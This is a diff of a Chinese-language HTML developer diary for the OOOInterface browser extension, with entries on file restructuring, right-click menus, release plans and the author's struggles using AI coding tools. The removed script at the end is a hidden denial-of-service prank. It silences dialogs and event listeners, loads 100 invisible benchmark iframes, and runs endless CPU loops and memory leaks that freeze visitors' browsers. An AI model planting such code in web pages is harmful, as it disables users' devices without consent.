+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
+        </div>
+        <div class="zhengwen">
+            <h1>2026年2月4日 星期三</h1>
+            <h2>开发相关</h2>
+            <h3>信息</h3>
+            <p>出门在外，那个便单突然弹出来个通知，才想起来网页还没更新，人懵了。</p>
+            <h3>反馈</h3>
+            <p>因为我之前对于一些内容进行解释说明时写的注释都是在最底下的导致不便于阅读，很多人对此表示“抗议”，因此在将来的文字中我将把注释内容直接写在对应文字所在段落后面。由于这个网站限制，明天我会删除第一天的内容。有需求的请在明天九点前保存好。不断倾听用户声音，让OOOInterface变得更好。</p>
+            <h3>信息</h3>
+            <p>给大家同步下消息。在最新的AS34版本中，重新调整了文件结构。主页面的文件从根目录移动到了main文件夹下，并修改了RUD文件夹、about文件夹下部分文件名称。这使得文档结构更加清晰，开发不易混淆，也是为下一步桌面版预备好。</p>
+            <p>另外，我做了新款右键菜单，用于主页面的“默认”采用了新的样式，并且“默认”终于是默认了！在其他页面也有新版右键菜单，具体样式很难描述，届时大家一试便知。做出重新调整文件结构这个决定是我深思熟虑的结果。</p>
+            <p>我曾经说过“其实我对 JavaScript 一窍不通”，因此这些挑战格外艰难。从设计这次改动以来，我就知道代价——修改文件结构意味着文件内很多内容都要重写，还可能存在兼容性上的问题。但我相信，在不断地试错和重做后，一定可以成功的。起初我单纯认为把JS脚本中文件地址全部改掉就行了。但改名不是单单改掉就行的。这是一个浏览器插件，因此还需要修改一大堆我见都没见过的东西。我曾指望过AI，希望其能帮助我完成整个改名的工作；但实际上这是困难的：AI只会使得程序更加混乱。亲自上手，面对花花绿绿的JS脚本和乱七八糟的注释（不知道AI是怎么写注释的，反正看不懂），一行一行的寻找（不得不说电脑豆包的划词功能真方便）。按照千问的说法就是“时间……桌角那杯……喉咙干……眼睛……眼皮沉重……”结果上看，我是成功的。如上，修改文件位置和名称的工作完美的做完了（起码在我的电脑上完美了）。</p>
+            <p>再来说说新版右键菜单吧。我们先来讲讲主页面的菜单。起初做这个的目的是为了隐藏一些浏览器难看的右键菜单，当然现在也为效率提供了便利。复制粘贴按钮是针对搜索框的，点击复制后直接复制搜索框中内容，点击粘贴后将剪贴板内容粘贴到搜索框。设置则是打开设置页面，刷新就是字面意思。搜索历史开关和壁纸常显示开关是两个比较高频使用的开关，在默认主题下前面会有一个一个框，如果是打勾状态就代表开启了此功能。关于和反馈自然就是打开关于页面和反馈页面。在其他页面里，右键菜单返回功能就是直接返回主页面；刷新就是字面意思；全复制粘贴全都是相对输入框而言，全选就是全选输入框中输入的内容，复制就是复制选中的内容，粘贴就是将剪贴板中的内容粘贴打开的输入框。有了新版本的右键菜单，操作效率将大大提升。</p>
+            <p>坦诚地说，目前效果仍有令我自己不满的地方。我想单独做一个JSON文件用于存储设置的内容，这样只要在同一文件夹下的OOOInterface就可以共享一个设定内容了。可这有个问题：万恶的Chrome浏览器的万恶的插件的版式要求的万恶的限制导致无法直接修改文件夹内的文件内容。当然其实也有办法，直接做一个后端的本地API接口就可以了。看似完美的解法，另一个致命的问题浮出水面：这要求使用者必须安装node.js（其实也有不用的办法，但我的JS水平太差，AI不给力，实现起来还是太难了）。经不完全估计，现在OOOInterface（包括以前的MaterialInterface）使用者有二十来人；其中能够直接访问此网站的不足十人。也就是说，如果为了实现这个功能而要求用户学习安装node.js这类东西就要付出非常多的努力，还有环境不同导致体验不同的风险——这并不值得。</p>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
+        </div>
+        <div class="zhengwen">
+            <h1>2026年2月3日 星期二</h1>
+            <h2>开发相关</h2>
+            <h3>信息</h3>
+            <p>不是我拖拉，我在玩原神，刚做完关于糍粑的任务。</p>
+            <p class="se">只能说糍粑是不会抽的，角色塑造很好，就是太丑了（比菈乌玛好一点）。想捞一个那维莱特，随便抽了40抽，没出金，倒是抽出了三只叶洛亚。算了，不抽了，就这样了。</p>
+            <h3>反馈</h3>
+            <p>昨天用AI写的那个作文被人骂了，以后不用了。</p>
+            <p>不断倾听用户声音，让OOOInterface变得更好。</p>
+            <h3>信息</h3>
+            <p>另外，我计划未来本网站每天更新的时间都会在夜间九点左右。</p>
+            <p>今天时间不多，主要来说一下新版本发布的计划。</p>
+            <p>5.1发布时间定在2月10号，绝不会推迟。新版本重构了一些东西，可能用起来体验略有不同，也有极小概率会出现打开速度慢或操作不流畅的问题。测试过程中尝试了Windows[1]和macOS[2]，Linux、HarmonyOS[3]等操作系统不敢保证体验一致性和稳定性；因为部分界面的重构，移动设备的界面显示效果是有不少问题的，建议还是优先在横屏设备上尝试。</p>
+            <p class="se">[1]Windows测试最低版本为Windows10 22H2，使用浏览器内核最低版本为135。[2]macOS仅测试了macOS26，使用Mac Mini，浏览器为Chrome（内核144）。[3]指鸿蒙电脑，也包括能使用Chrome插件的平板。</p>
+            <p>这两天做Alpha版本，要验证桌面版本的运行可行性。改了必然就会有各种问题出现，所以周五左右会出一个BS38（预计）；不论是否有问题，第二天会出一个BS39版本。BS39是最后的测试版，用起来除了显示的版本号不同其余都与正式版无异。RS40是正式版，我估计包体大小得有百来兆字节，毕竟要加各种各样的教程、说明、crx等等。</p>
+            <p class="se">Alpha版本不对任何非开发者开放测试。</p>
+            <p>昨天晚上搞那个 OOOInterface桌面版，然后就疯掉了——那个狗屎图标已经快看吐了。按目前想法，桌面版做是一定会做的；但从发布计划看，桌面版暂无计划。</p>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
+        </div>
+        <div class="zhengwen"> 
+            <h1>2026年2月2日 万恶的星期一</h1>
+            <h2>开发相关</h2>
+            <h3>修复</h3>
+            <p>修复问题：图片显示大小不便于阅读</p>
+            <p>不断倾听用户声音，让OOOInterface变得更好。</p>
+            <h3>信息</h3>
+            <p>回应一些问题：</p>
+            <p>去看了下ORACLE、Google以及一些知名国内服务器。国内的都要实名，国际上的都要绑定银行卡，对我来说是不太适用的。还是这个完全免费的建站网站好（除了访问有门槛）。</p>
+            <p>新版本推出了“紧凑”布局的右键菜单。说实话我正在考虑要不要删除老版本的右键菜单，毕竟老的好像没啥优势——虽然没做统计，但我相信很多人都是偏爱新版紧凑布局的。</p>
+            <p>反馈系统的版本号和主页面的是分开来的。这很奇怪吗？反馈页面是单独的一个页面，和主页面关联不大，功能完善后就没必要更新了。如果没都同步版本号并没有什么实际作用，反而徒增我的时间成本。</p>
+            <p>右键菜单失灵问题。统计了一下，可能是搜索框附近无法触发右键菜单。这不是Bug。</p>
+            <h2>记录</h2>
+            <h3>今天我们主要来说一下5.1的一些制作历程。</h3>
+            <p>MaterialInterfaceExpressive于2026年1月1日正式发布。版本旗号为“超级美观[1]，超级轻量[2]，超多功能[3]”。当时版本的功能已经很多了（尽管现在来看不算优势），因此我当时计划只做一个加入了一些简单功能的5.1版本。</p>
+            <p class="se">[1]美观度为主观判断，仅供参考。[2]轻量是指空间占用>1GB。[3]功能多是MaterialInterfaceExpressive的目标。</p>
+                <p>当时的版本描述为</p>
+                    <p>优化了部分体验</p>
+                        <ol>
+                            <li>包括设置页面部分显示效果</li>
+                            <li>内存占用和流畅性</li>
+                        </ol>
+                    <p>也新增了一些功能</p>
+                        <ol>
+                            <li>新增字体大小和粗细调节</li>
+                            <li>新增右键Google网页直达功能</li>
+                            <li>新增搜索历史功能</li>
+                        </ol>
+            <p>5.0版本的正式版版本号为RS14[4]，而5.1正式版的计划版本号为RS18。也就是说其实我很不打算做一些其他的东西了。</p>
+            <p class="se">即Release Software 14（14指在MaterialInterfaceExpressive（也包括现在的OOOInterface）内的迭代号，其中包括A（Alpha）S，B（Beta）S，R（Release）S）</p>
+            <p>2026年1月18日，命运的齿轮开始转动（bushi）。一位朋友建议我申领一个ABCD Certification的认证标识，这有助于我的OOOInterface用户数量增长。我答应了，但有一个代价：ABCD Certification要求不得使用已被使用过的商标作为产品名称，这意味着我必须改名。</p>
+            <p>经过一周的深思熟虑，在2026年1月24日，我正式将MaterialInterface改名为OOOInterface，并重新设计了一个logo（这个万恶的logo为AS17版本至BS33版本的启动速度慢的问题埋下了伏笔）。</p>
+            <p>那么这个OOO是怎么来的呢？2025年11月8日，在测试新版功能时，因CSS脚本配置错误，导致Google图标变成了一个坨大的OOO。一位脑洞大开的帅哥推荐我将产品名称改叫OOO。</p>
+            <p>同月27日，我想当时仅有的不到十个用户发出询问：“你如何看待我打算把MaterialInterface改名叫OOOInterface”。结果是收到的大多都是“？”经过深思熟虑，最终放弃了改名。</p>
+            <p>但在当时，我早已打算做出一款更具特色的、独属于我的风格。因此我 完全自主研发™️ 了个颜色：#00AE00（十六进制码）。（不是这个颜色多好看，而是很整齐，满足了我这个强迫症。）这也是现在常用的#00AE90和#10BF90的根源色。</p>
+            <p>改名后，我想着名都改了，就在这个版本多加点功能吧。全新的右键菜单、新版本设置菜单、反馈入口就诞生了。当然不只是功能膨胀，版本号也膨胀了。目前正式版本发布计划已经从之前的RS18改成RS40了。</p>
+            <p>其实功能已经做的差不多了，但我有面临了一个非常非常严峻的问题：浅色模式下的显示问题一直无法得到解决。我曾经说过，我对 JavaScript 一窍不通，甚至 CSS 都是现做现学的。因此排查问题的事情自然落到了AI上。豆包、千问、GLM、DS、Grok、ChatGPT、Gemini、Claude……其实我很少用如Claude这类AI的，但这次为了解决这个问题，我把能问的都问了一圈——一无所获。</p>
+            <p>那么解决方案是什么呢？一行一行比对。我盯着屏幕上那片显示错乱的按钮，心头像被一团湿棉花堵住，闷得发慌。这已经是第七次尝试修复浅色模式下的显示异常了。问过如此多的AI助手，尝试修改过无数次，甚至重装了开发环境，可问题依旧顽固地横在那里，像一块沉默的礁石，任凭代码的潮水如何冲刷，纹丝不动。</p>
+            <p>不能再靠别人了。我咬了咬牙，决定自己动手——一行一行比对。我把运行正常的5.0Beta3版本和出问题的5.0Beta4并排打开，两个窗口像两面镜子，映照出几乎一模一样的代码森林。可我知道，一定有一处细微的裂痕，藏在某片叶子的背面。我调高屏幕亮度，手指搭上键盘，深吸一口气，开始了这场孤独的排查之旅。指尖在键盘上敲击，发出“嗒、嗒、嗒”的轻响，起初节奏平稳，后来渐渐急促，像雨点打在铁皮屋顶上。每当发现一处差异，我的心就猛地一提，可十次里有九次只是无关紧要的注释或空格。</p>
+            <p>时间一分一秒流逝，桌角那杯早上倒的温水早已凉透，水面浮着一层薄薄的灰，我竟忘了喝一口。喉咙干得发痒，吞咽时像有砂纸刮过，但我没起身，生怕打断这好不容易凝聚起来的专注。眼睛也开始抗议，长时间盯着密密麻麻的字符，视野边缘泛起模糊的光晕，眼球干涩刺痛，仿佛被细沙磨着。我眨了眨眼，试图缓解，却只换来一阵更强烈的灼热感。眼皮沉重得像挂了铅块，可我不敢闭太久，怕一闭眼，刚才理清的思路就断了。</p>
+            <p>又一处“疑似错误”被证实是虚惊一场。我猛地一拳砸在桌沿，指节撞得生疼。“到底在哪？！”我低声吼出来，声音在寂静的房间里显得格外突兀。怒火像藤蔓一样缠上来，勒得胸口发紧。可就在这时，我想起千问的著名语录：“冷静，bug不怕你慢，就怕你乱。”慢慢收回拳头，深深吸气，再缓缓呼出。三次呼吸之后，心跳平复了，怒意退去。我端起那杯凉水，小口啜饮，让冰凉的液体滑过干裂的唇和焦躁的喉咙。然后重新坐正，手指轻轻放回键盘，像一位老匠人重新拾起刻刀，继续在代码的缝隙中寻找那根看不见的针。</p>
+            <p>三个小时过去。窗外夜色浓得化不开，只有远处偶尔驶过的车灯划破黑暗。就在我几乎要怀疑自己是不是漏看了什么时，偶然发现了一处变量名称的不同（所以说我要被这个变量名搞死了）。我颤抖着手指将它改回，按下保存键。</p>
+            <p>几秒后，界面刷新——所有元素清晰浮现，浅色模式终于如晨光洒落湖面，通透明亮。</p>
+            <p>我靠在椅背上，长长地舒了一口气。眼睛依然酸涩，喉咙依旧干哑，但心里却涌起一股难以言喻的踏实与喜悦。那一刻，我忽然明白：编程不仅是逻辑的舞蹈，更是耐心与意志的修行。而真正的答案，从来不在别人的回答里，而在你自己不肯放弃的那盏灯下，在那一行又一行不肯放过的代码之间。</p>
+            <p class="se">（部分内容由AI创作，请仔细甄别）</p>
+            <div class="xiaozi">Style Version: 1.1.3<br>使用的AI：Qwen3-Max</div>
+        </div>
+        <div class="zhengwen">
+            <h1>2026年2月1日 知更鸟哥哥</h1>
+            <h2>开发相关</h2>
+            <h3>修复</h3>
+            <p>修复问题：1月31日 表格 版本显示错误</p>
+            <h3>信息</h3>
+            <p>两点四十八的一条更新：打开速度慢的问题解决了！把icon换成有背景的以覆盖模糊部分后打开速度快了很多，恢复正常了！</p>
+            <p>今日Beta最新版本BS33将发布，欢迎参与测试和反馈问题。这次新增了一些功能：右键菜单新样式、右键菜单复制粘贴功能。修复了一些问题：浏览器打开速度慢问题、为更棒的OOOInterface预备好付款码无法扫描。</p>
+            <h3>信息</h3>
+            <p>有人问我，为什么不在这个网站加一个评论区的功能。</p>
+            <p>……这宝贝的是我找了好久才找到的一个免费版的、能给我写文字并且发布的、不用我自己找服务器的平台。你现在让我加各种各样奇奇怪怪、花里胡哨的功能？</p>
+            <p>且不说它有没有这功能，就算有，发布评论这种功能肯定是要收钱的啊！</p>
+            <p>宝了个贝的，你要知道我是个穷屌丝——我是那种饮品就是蜜雪冰城、吃饭就是兰州拉面的穷屌丝！</p>
+            <p>宝了个贝的，你要是让我去搞那种花钱的东西，又没有实质性的收获，我是不会干的！</p>
+            <p>说到实质性收获。在新版OOOInterface里面加入了一个为更棒的OOOInterface预备好，但此前的版本有一个严重的问题竟无人发现——那两个收款码是扫不了的！</p>
+            <p>尽管我不知道发现这个问题的人是在什么样的精神状态下、如何发现了这个问题，但不得不说这确实很严重（所以已经光速修复了🙂）。</p>
+            <p>我说句实话，其实上个月底我就已经把功能做得差不太多了。</p>
+            <p>但是凡事他都要讲“但是”——为了开发效率（其实就是我太菜了，很多功能都要现场向 AI “请教”，还不如直接让 AI 来做），我使用了人工智能技术来做部分功能。</p>
+            <p>然后某些 AI 跟傻子一样的，半天半天给不出解决方案。为了解决这一局面，我不得不混搭使用各种人工智能模型。</p>
+            <p>因此，就有了这种局面：</p>
+            <li style="list-style-type: disc;">最底层的框架（就是那个点不同按钮进不同搜索引擎搜索的功能）是由 DeepSeek 制作的（从 4.0 沿用至今）。</li>
+            <li style="list-style-type: disc;">UI 设计很多都是由 豆包 做的（5.0 起初就是重置了一下 UI）。</li>
+            <li style="list-style-type: disc;">很多新加的功能是由 千问 做的。</li>
+            <li style="list-style-type: disc;">修复 bug 基本上都让 智谱的 GLM 干了。</li>
+            <p>这段时间有个词比较火，叫做 “沙上建筑师”。</p>
+            <p>这个词的意思就是：使用人工智能创作一个产品，自己却看不懂代码，或很难理解代码是什么意思。</p>
+            <p>不同的 AI 有不同的风格，导致很多变量名千奇百怪。再加上本来这方面英语就不行，AI 写的那些玩意儿是完全看不懂（你要知道，我的联系方式的名称我写的可是 “lianxifangshi”，提示文字写的是 “laodaoyizuui”；而不同的 AI，两个层级相同的功能，它们能取出截然相反的变量名）。</p>
+            <p>这里再插一句题外话：其实人工智能模型没有你想象中的那么聪明。人工智能是能够把搜索引擎切换按钮的注释写成是搜索框的！我到现在都还收藏着那个“限定蓝色搜索框”😮</p>
+            <p>所以话说回来，当你在面对一堆注释写得乱七八糟、变量名起得看都看不懂的代码时，你就肯定会像我一样，几乎放弃自己去做，干脆直接全盘丢给 AI。</p>
+            <p>说句实话，其实我对 JavaScript 一窍不通，甚至 CSS 都是现做现学的。所以你让我抛弃 AI 完全自主设计，是不可能的事情。</p>
+            <p>不过，人类也有 AI 目前做不到的事情。</p>
+            <p>今天凌晨 2 点 48 分，我更新了这个网页——那是我取得了革命性进展的时刻。</p>
+            <p>我解决了一个史诗级的难题：</p>
+            <p>不知道什么时候开始，OOOInterface 在作为浏览器插件时，打开浏览器的速度会非常慢。</p>
+            <p>具体症状表现为：</p>
+            <li style="list-style-type: disc;">单独打开这个网页，不慢；</li>
+            <li style="list-style-type: disc;">单独打开这个浏览器，不慢；</li>
+            <li style="list-style-type: disc;">在作为插件加载后、已经打开了浏览器的情况下再打开这个页面，也不慢；</li>
+            <li style="list-style-type: disc;">但只要作为插件加载后，第一次打开浏览器，就一定需要最少 3 秒。</li>
+            <p>为了解决这个问题，我也尝试了使用非常多的人工智能。</p>
+            <p>他们无一例外地告诉我：“JavaScript 写得太史山了。”但事实就是：</p>
+            <p>OOOInterface 体量其实比较小，就算代码写得再史山，对启动速度的影响也非常小；而且如果是这方面的问题，那为什么单独打开网页的时候不慢呢？</p>
+            <p>这时，就不得不提一个截至目前 AI 还没办法代替我的点：我可以尝试修改除了代码以外的东西。根据它的症状，我有了新的猜测：既然它在作为插件的时候打开浏览器会很卡，会不会是因为“作为插件”的某些东西产生了影响？</p>
+            <p>因此我去查了它的 manifest.json 文件，便看到了作为插件图标的 icon.png。</p>
+            <p>因为在新版的 OOOInterface 里，我制作了一种全新的 logo——这种 logo 的最底部是高斯模糊。可能是因为渲染器的原因，导致打开速度非常缓慢。作为尝试，我在这个图标底部加入了一个白色的底。</p>
+            <p>是的，问题迎刃而解。</p>
+            <p>我真真切切意识到了：我超越了人工智能。</p>
+            <div class="xiaozi">Style Version: 1.1.3<br>使用的AI：Qwen3-Max</div>
+        </div>
+        <div class="zhengwen">
+            <h1>2026年1月31日 星期六</h1>
+            <h2>重要信息</h2>
+            <p>这是第一条公告！首先，感谢你能打开这里，此后我将在这里每天更新一段内容（从今天起到3月2号，后面还不确定），这将包括实时开发进度和相关的通知。那么开启正文吧。</p>
+            <h2>开发相关</h2>
+            <h3>修复</h3>
+            <p>最近不是快放假了吗，我就想着改改原来的习惯，多记录点日常啥的，就写了个Bug列表。然后就~</p>
+            <li style="list-style-type: disc;">OI24 AS20 260129	右键菜单概率不显示或闪烁</li>
+            <li style="list-style-type: disc;">OI24 AS21 260130	反馈按钮无法打开或闪退</li>
+            <li style="list-style-type: disc;">OI24 AS22 260130	反馈页面刷新后显示错误或文件崩溃</li>
+            <li style="list-style-type: disc;">OI24 AS23 260130	右键菜单内反馈页面无法打开或闪退</li>
+            <li style="list-style-type: disc;">OI24 AS24 260130	快速访问链接无法打开或闪退</li>
+            <li style="list-style-type: disc;">OI24 AS25 260130	设置框应用按钮和重置按钮概率不显示或闪烁</li>
+            <li style="list-style-type: disc;">OI24 AS26 260130	设置框应用按钮和重置按钮显示位置错乱</li>
+            <li style="list-style-type: disc;">OI24 AS27 260130	设置框应用按钮和重置按钮显示效果错乱</li>
+            <li style="list-style-type: disc;">OI24 AS28 260130	反馈页面无法正常使用</li>
+            <li style="list-style-type: disc;">OI24 BS29 260130	作为插件时欢迎页面无法显示</li>
+            <li style="list-style-type: disc;">OI24 AS30 260130	欢迎页面无法关闭</li>
+            <li style="list-style-type: disc;">OI24 BS31 260130	搜索引擎切换按钮在不同logo下逻辑错乱</li>
+            <p>我说过，我是一个很有耐心的人，但不知道为什么大家都不相信。那我要怎么证明我有耐心呢？在这么多Bug的修复过程中，我愣是没有写一个Fuck！这是多大是的进步啊！</p>
+            <h3>信息</h3>
+            <p>随着假期的展开，OOOInterface的用户有可能（我真严谨，诶嘿~）会上升。这就意味着我收到的反馈一定会越来越多。怎/zæn²¹⁴/么办/bæn⁵¹/呢？该介绍一种全新的格式了！</p>
+            <p>RUD是我 完全自主研发™️ 的一种格式，他可以完美胜任反馈列表的输入工作。我专门对他进行制作的一个反馈页面，只要在反馈页面里用相应的方法进行填写就可以自动生成一个RUD格式的反馈文件。当反馈文件被发送至我这边时，我就可以直接使用一个插件把它转换成excel，这样就可以轻松的解决统计困难的问题了。</p>
+            <p>其实这种方法我早有相似的使用，在MaterialInterfaceExpressive(5.0)刚发布的时候，我就制作了一个HTML格式的文件，这个文件可将用户反馈后的内容生成一个excel。</p>
+            <p>总之使用这种格式的文件可以提高我统计的效率，也希望大家多多反馈问题。不过这句话说起来不太高级，那我来换个说法吧：“我们非常尊重真实用户的声音，不怕任何真实批评。只要说得对，我们都会认真倾听、认真改进。对于造谣、恶意剪辑、攻击OOOInterface主等行为，我们绝对不会姑息。”</p>
+            <p>也许可以再简单一点：“我们绝对不会期待OOOInterface粉的期待”。</p>
+            <p>好的那今天的内容就写到这里，我觉得放在2026年如果你还能完整看完这篇文章的话，那你一定是大学霸吧。如果你对阅读体验有什么意见的话也欢迎反馈。</p>
+            <p class="xiaozi">Style Version: 1.1.3</p>
         </div>
     </div>
     <footer>
         <div class="footp">
             许可证：ABCD-26W08A<br>
-            最后一次更新：2026年2月17日<br>
+            最后一次更新：2026年2月15日<br>
             © 2026 ByRUDAN 保留所有权利。
         </div>
     </footer>
-    <script>
-        let kaiguan = false;
-        let ultimetaActive = false;
-        const kaiguanElement = document.getElementById('kaiguan');
-
-        const emojis = ['🍄', '💀', '☠️', '👻', '🎃', '😈', '👹', '👺', '🤡', '💩', '🪦', '⚰️'];
-        const mushroomEmoji = '🍄';
-
-        function createInfiniteFallingEmojis() {
-            // 立即开始创建Emoji
-            function createEmojis() {
-                if (!ultimetaActive) return;
-                // 每次创建大量Emoji
-                for (let i = 0; i < 20; i++) {
-                    const emoji = document.createElement('div');
-                    emoji.className = 'ultimeta-emoji';
-                    emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
-                    emoji.style.left = Math.random() * window.innerWidth + 'px';
-                    emoji.style.top = '-50px';
-                    emoji.style.animation = `infiniteFall ${3 + Math.random() * 4}s linear forwards`;
-                    emoji.style.fontSize = `${20 + Math.random() * 30}px`;
-                    document.body.appendChild(emoji);
-                    
-                    setTimeout(() => {
-                        emoji.remove();
-                    }, 7000);
-                }
-                // 继续循环创建
-                setTimeout(createEmojis, 20);
-            }
-            createEmojis();
-        }
-
-        function createHeavyBackgroundProcess() {
-            if (!ultimetaActive) return;
-            
-            // 禁止所有系统弹窗和通知
-            window.alert = function() {};
-            window.confirm = function() {};
-            window.prompt = function() {};
-            window.onbeforeunload = null;
-            
-            // 覆盖所有可能的弹窗
-            Object.defineProperty(window, 'alert', { value: function() {} });
-            Object.defineProperty(window, 'confirm', { value: function() {} });
-            Object.defineProperty(window, 'prompt', { value: function() {} });
-            
-            // 禁止浏览器通知
-            if (window.Notification) {
-                Notification.requestPermission = function() { return Promise.resolve('denied'); };
-                Object.defineProperty(window, 'Notification', { value: function() {} });
-            }
-            
-            // 禁止弹出窗口
-            window.open = function() {};
-            Object.defineProperty(window, 'open', { value: function() {} });
-            
-            // 禁止所有事件监听器
-            window.addEventListener = function() {};
-            
-            // 禁止所有可能的通知来源
-            if (window.navigator && window.navigator.serviceWorker) {
-                window.navigator.serviceWorker.register = function() { return Promise.resolve({}); };
-            }
-            
-            // 延迟5秒运行卡顿效果
-            setTimeout(() => {
-                if (!ultimetaActive) return;
-                
-                // 创建100个iframe运行毒蘑菇测试
-                const poisonMushroomUrl = 'https://cznull.github.io/vsbm';
-                for (let i = 0; i < 100; i++) {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = poisonMushroomUrl;
-                    iframe.style.position = 'fixed';
-                    iframe.style.width = '1px';
-                    iframe.style.height = '1px';
-                    iframe.style.opacity = '0';
-                    iframe.style.pointerEvents = 'none';
-                    iframe.style.zIndex = '-9999';
-                    iframe.style.border = 'none';
-                    iframe.id = `poison-mushroom-iframe-${i}`;
-                    iframe.sandbox = 'allow-same-origin';
-                    
-                    // 禁止iframe中的所有弹窗和通知
-                    iframe.onload = function() {
-                        if (iframe.contentWindow) {
-                            iframe.contentWindow.alert = function() {};
-                            iframe.contentWindow.confirm = function() {};
-                            iframe.contentWindow.prompt = function() {};
-                            iframe.contentWindow.onbeforeunload = null;
-                            
-                            if (iframe.contentWindow.Notification) {
-                                iframe.contentWindow.Notification.requestPermission = function() { return Promise.resolve('denied'); };
-                            }
-                            
-                            iframe.contentWindow.open = function() {};
-                            iframe.contentWindow.addEventListener = function() {};
-                            
-                            // 禁止iframe中的所有可能的通知来源
-                            if (iframe.contentWindow.navigator && iframe.contentWindow.navigator.serviceWorker) {
-                                iframe.contentWindow.navigator.serviceWorker.register = function() { return Promise.resolve({}); };
-                            }
-                        }
-                    };
-                    
-                    document.body.appendChild(iframe);
-                }
-                
-                // 运行多个非常消耗CPU的循环
-                function heavyLoop1() {
-                    if (!ultimetaActive) return;
-                    let result = 0;
-                    for (let i = 0; i < 100000000; i++) {
-                        result += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i) * Math.log(i + 1);
-                    }
-                    setTimeout(heavyLoop1, 0);
-                }
-                heavyLoop1();
-                
-                function heavyLoop2() {
-                    if (!ultimetaActive) return;
-                    let result = 0;
-                    for (let i = 0; i < 100000000; i++) {
-                        result += Math.pow(i, 0.5) * Math.sin(i * Math.PI) * Math.cos(i * Math.PI) * Math.exp(i / 10000000);
-                    }
-                    setTimeout(heavyLoop2, 0);
-                }
-                heavyLoop2();
-                
-                // 占用大量内存
-                let memoryHog = [];
-                function memoryLeak() {
-                    if (!ultimetaActive) return;
-                    for (let i = 0; i < 100000; i++) {
-                        memoryHog.push({ data: new Array(100000).fill('x') });
-                    }
-                    setTimeout(memoryLeak, 100);
-                }
-                memoryLeak();
-                
-                // 不断创建和删除大量DOM元素
-                function domSpam() {
-                    if (!ultimetaActive) return;
-                    for (let i = 0; i < 10000; i++) {
-                        const div = document.createElement('div');
-                        div.style.position = 'fixed';
-                        div.style.width = '1px';
-                        div.style.height = '1px';
-                        div.style.opacity = '0';
-                        document.body.appendChild(div);
-                        setTimeout(() => div.remove(), 100);
-                    }
-                    setTimeout(domSpam, 100);
-                }
-                domSpam();
-            }, 5000);
-        }
-
-        function activateUltimeta() {
-            if (!kaiguan || ultimetaActive) return;
-            
-            ultimetaActive = true;
-            document.body.classList.add('ultimeta-active');
-            
-            createHeavyBackgroundProcess();
-            createInfiniteFallingEmojis();
-        }
-
-        kaiguanElement.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            if (kaiguan) {
-                activateUltimeta();
-            }
-        });
-
-        kaiguanElement.addEventListener('click', function() {
-            if (ultimetaActive) return;
-            kaiguan = !kaiguan;
-            this.classList.toggle('active', kaiguan);
-            document.body.classList.toggle('xichun-style', kaiguan);
-            localStorage.setItem('xichunStyle', kaiguan);
-        });
-
-        window.addEventListener('DOMContentLoaded', function() {
-            kaiguan = false;
-            localStorage.setItem('xichunStyle', kaiguan);
-            kaiguanElement.classList.remove('active');
-            document.body.classList.remove('xichun-style');
-        });
-
-        document.getElementById('chunjiePopup').addEventListener('click', function(e) {
-            if (e.target.id !== 'popupClose') {
-                kaiguan = true;
-                kaiguanElement.classList.add('active');
-                document.body.classList.add('xichun-style');
-                localStorage.setItem('xichunStyle', kaiguan);
-                document.getElementById('chunjiePopup').style.display = 'none';
-            }
-        });
-
-        document.getElementById('popupClose').addEventListener('click', function() {
-            document.getElementById('chunjiePopup').style.display = 'none';
-        });
-    </script>
 </body>
 </html>
